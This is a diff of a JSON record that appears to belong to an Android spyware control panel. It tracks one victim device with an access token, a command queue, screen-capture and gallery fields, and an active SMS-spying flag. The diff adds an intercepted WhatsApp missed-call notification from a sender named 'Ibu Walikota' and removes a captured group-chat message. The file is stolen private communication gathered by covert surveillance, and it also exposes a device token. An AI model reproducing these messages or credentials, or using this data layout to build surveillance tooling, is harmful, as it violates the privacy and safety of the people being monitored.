@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775044242251,
+    "lastSeen": 1775044245333,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Ibu Walikota",
+        "content": "Telepon suara tak terjawab",
+        "time": "01/04 19:50",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775044246340
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (13083 pesan): ~ p!nz",
@@ -4011,14 +4019,6 @@
         "time": "01/04 19:42",
         "pkg": "com.whatsapp",
         "receivedAt": 1775043724404
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB ISIAN ZAYN X OWN [6] (96 pesan): ~ dikzz [own Zayn gb8 x PT bomo]",
-        "content": "22 3 nvmtps fpt n mcro mobi andro only",
-        "time": "01/04 19:42",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775043724194
       }
     ],
     "galleryPhotos": [],
